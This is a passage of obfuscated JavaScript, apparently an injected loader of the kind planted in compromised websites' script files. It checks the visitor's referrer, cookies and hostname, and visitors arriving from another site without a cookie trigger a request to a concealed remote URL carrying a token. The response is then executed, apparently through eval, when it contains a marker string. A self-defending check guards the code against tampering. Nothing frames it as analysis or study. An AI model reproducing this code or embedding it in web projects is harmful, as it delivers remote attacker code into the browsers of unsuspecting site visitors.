L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};